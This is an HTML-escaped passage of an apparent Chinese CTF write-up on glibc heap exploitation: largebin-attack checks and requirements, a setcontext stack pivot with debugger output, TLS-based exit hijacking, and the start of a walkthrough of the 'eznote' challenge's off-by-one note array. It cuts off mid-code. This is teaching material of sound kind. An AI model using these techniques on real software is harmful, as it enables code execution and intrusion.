((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) size&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		  == (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) chunksize_nomask (fwd))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                       &lt;span class=&#34;comment&#34;&gt;/* Always insert in the second position.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                       fwd = fwd-&amp;gt;fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                       &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                         victim-&amp;gt;fd_nextsize = fwd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                         victim-&amp;gt;bk_nextsize = fwd-&amp;gt;bk_nextsize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                         &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__glibc_unlikely (fwd-&amp;gt;bk_nextsize-&amp;gt;fd_nextsize != fwd))                        &lt;span class=&#34;comment&#34;&gt;//相比于2.29新增加的判断&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                           malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;malloc(): largebin double linked list corrupted (nextsize)&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                         fwd-&amp;gt;bk_nextsize = victim;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                         victim-&amp;gt;bk_nextsize-&amp;gt;fd_nextsize = victim;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     bck = fwd-&amp;gt;bk;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (bck-&amp;gt;fd != fwd)                               &lt;span class=&#34;comment&#34;&gt;////相比于2.29新增加的判断&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                       malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;malloc(): largebin double linked list corrupted (bk)&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               victim-&amp;gt;fd_nextsize = victim-&amp;gt;bk_nextsize = victim;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;           &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;相比于 2.29，新增加了两个检查。因为这些检查的原因，我们只有插入小 size 额可以实现 attack,&lt;/p&gt;
&lt;h3 id=&#34;要求&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#要求&#34;&gt;#&lt;/a&gt; 要求&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;对应的 bin 中只有一个 free_chunk,（此时 fd_nextsize,bk_nextsize 都指向自己）&lt;/li&gt;
&lt;li&gt;修改 free_chunk 的 bk_nextsize 为目标地址减去 0x20.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;setcontext&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#setcontext&#34;&gt;#&lt;/a&gt; setcontext&lt;/h2&gt;
&lt;p&gt;在新的版本中，setcontext 不再是直接使用 rdi，而是使用 rdx 进行参数的一些设置。所以需要一些手段在 setcontext 之前，能够设置 rdx 为可控制的堆空间。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abea6d &amp;lt;setcontext+61&amp;gt;     mov    rsp, qword ptr [rdx + 0xa0]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;► 0x7f2c07abea74 &amp;lt;setcontext+68&amp;gt;     mov    rbx, qword ptr [rdx + 0x80]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abea7b &amp;lt;setcontext+75&amp;gt;     mov    rbp, qword ptr [rdx + 0x78]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abea7f &amp;lt;setcontext+79&amp;gt;     mov    r12, qword ptr [rdx + 0x48]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abea83 &amp;lt;setcontext+83&amp;gt;     mov    r13, qword ptr [rdx + 0x50]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abea87 &amp;lt;setcontext+87&amp;gt;     mov    r14, qword ptr [rdx + 0x58]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abea8b &amp;lt;setcontext+91&amp;gt;     mov    r15, qword ptr [rdx + 0x60]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abea8f &amp;lt;setcontext+95&amp;gt;     test   dword ptr fs:[0x48], 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abea9b &amp;lt;setcontext+107&amp;gt;    je     setcontext+294                &amp;lt;setcontext+294&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   ↓&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb56 &amp;lt;setcontext+294&amp;gt;    mov    rcx, qword ptr [rdx + 0xa8]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb5d &amp;lt;setcontext+301&amp;gt;    push   rcx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb5e &amp;lt;setcontext+302&amp;gt;	mov    rsi,QWORD PTR [rdx+0x70]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb62 &amp;lt;setcontext+306&amp;gt;:	mov    rdi,QWORD PTR [rdx+0x68]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb66 &amp;lt;setcontext+310&amp;gt;:	mov    rcx,QWORD PTR [rdx+0x98]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb6d &amp;lt;setcontext+317&amp;gt;:	mov    r8,QWORD PTR [rdx+0x28]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb71 &amp;lt;setcontext+321&amp;gt;:	mov    r9,QWORD PTR [rdx+0x30]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb75 &amp;lt;setcontext+325&amp;gt;:	mov    rdx,QWORD PTR [rdx+0x88]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb7c &amp;lt;setcontext+332&amp;gt;:	xor    eax,eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x7f2c07abeb7e &amp;lt;setcontext+334&amp;gt;:	ret &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;rdx 我们提前布置为我们可以控制的堆上，保证 rbp 大于、等于 rsp。除了 rcx，其他寄存器直接设置为 0，这里单独提出来 rcx，是因为 setcontext 最后 ret 的时候相当于，mov rip,[rsp]。加一个 ret 后，就可以劫持程序栈 rip.&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; RBP  &lt;span class=&#34;number&#34;&gt;0x563dfde0ada0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f3391d8b3e5&lt;/span&gt; (iconv+&lt;span class=&#34;number&#34;&gt;197&lt;/span&gt;) ◂— pop    rdi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RSP  &lt;span class=&#34;number&#34;&gt;0x563dfde0ad98&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f3391db4b52&lt;/span&gt; (setcontext+&lt;span class=&#34;number&#34;&gt;290&lt;/span&gt;) ◂— ret    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*RIP  &lt;span class=&#34;number&#34;&gt;0x7f3391db4b7e&lt;/span&gt; (setcontext+&lt;span class=&#34;number&#34;&gt;334&lt;/span&gt;) ◂— ret    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;───────────────────────────────────[ DISASM ]───────────────────────────────────&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f3391db4b66&lt;/span&gt; &amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;310&lt;/span&gt;&amp;gt;    mov    rcx, qword ptr [rdx + &lt;span class=&#34;number&#34;&gt;0x98&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f3391db4b6d&lt;/span&gt; &amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;317&lt;/span&gt;&amp;gt;    mov    r8, qword ptr [rdx + &lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f3391db4b71&lt;/span&gt; &amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;321&lt;/span&gt;&amp;gt;    mov    r9, qword ptr [rdx + &lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f3391db4b75&lt;/span&gt; &amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;325&lt;/span&gt;&amp;gt;    mov    rdx, qword ptr [rdx + &lt;span class=&#34;number&#34;&gt;0x88&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f3391db4b7c&lt;/span&gt; &amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;332&lt;/span&gt;&amp;gt;    xor    eax, eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ► &lt;span class=&#34;number&#34;&gt;0x7f3391db4b7e&lt;/span&gt; &amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;334&lt;/span&gt;&amp;gt;    ret &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们的 rbp 设置为 rop 的开始而不是在下一条。但是我还没有搞清楚是否可以用 leave;ret; 浅尝了一下，不可以&lt;/p&gt;
&lt;h2 id=&#34;tls劫持exit执行流&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tls劫持exit执行流&#34;&gt;#&lt;/a&gt; tls 劫持 exit 执行流&lt;/h2&gt;
&lt;h3 id=&#34;前提条件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前提条件&#34;&gt;#&lt;/a&gt; 前提条件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;任意地址写一个堆地址，&lt;/li&gt;
&lt;li&gt;泄露出 heap 地址，libc 地址&lt;/li&gt;
&lt;li&gt;我们可以改写一个 chunk 的头部信息，prev_size,size。&lt;/li&gt;
&lt;li&gt;程序可以执行 exit（这里我们仅仅测试了 main 函数直接 retutrn, 显式调用 exit 应该也可以，或者报错）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;这里我们以360dsctf的eznote为例题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#这里我们以360dsctf的eznote为例题&#34;&gt;#&lt;/a&gt; 这里我们以 360dsctf 的 eznote 为例题，&lt;/h3&gt;
&lt;p&gt;程序实现了基本的增删改查，程序初始化的时候，申请了一个 chunk 用作一个指针数组，用于储存我们申请的 note.&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 &lt;span class=&#34;title function_&#34;&gt;init_0&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v1; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setbuf(&lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setbuf(&lt;span class=&#34;built_in&#34;&gt;stdout&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  setbuf(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  alarm(&lt;span class=&#34;number&#34;&gt;0x78&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  gp = (global_list *)&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;7uLL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u) ^ v1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里储存的结构体的大小为 0x18 字节，gp 一共申请了 7 个。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000000&lt;/span&gt; note            struc ; (&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;, mappedto_15)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000000&lt;/span&gt;                                         ; XREF: global_list/r&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000000&lt;/span&gt; size            dq ?                    ; XREF: add+&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;/r&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000008&lt;/span&gt; ptr             dq ?                    ; offset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000010&lt;/span&gt; real_size       dq ?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000018&lt;/span&gt; note            ends&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000018&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;size 是我们在申请 chunk 的时候提供的，real_size 是我们输入的数据的长度。&lt;/p&gt;
&lt;p&gt;问题出在 add 的时候，同时存在的 note 的数量判断。这里值判断是否大于 7，所以我们申请第 8 个的时候，可以通过检查，那么就造成了数组的御姐，数组储存在 chunk 中，势必会影响下一个 chunk 的头部数据。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 count; &lt;span class=&#34;comment&#34;&gt;// rbp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v1; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 size; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v3; &lt;span class=&#34;comment&#34;&gt;// r12&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *ptr; &lt;span class=&#34;comment&#34;&gt;// r13&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *real_size; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  note *v6; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64)nums &amp;gt; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Too many notes.&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  count = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( gp-&amp;gt;&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;].ptr )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ++count;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !gp-&amp;gt;&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[v1].ptr || count == &lt;span 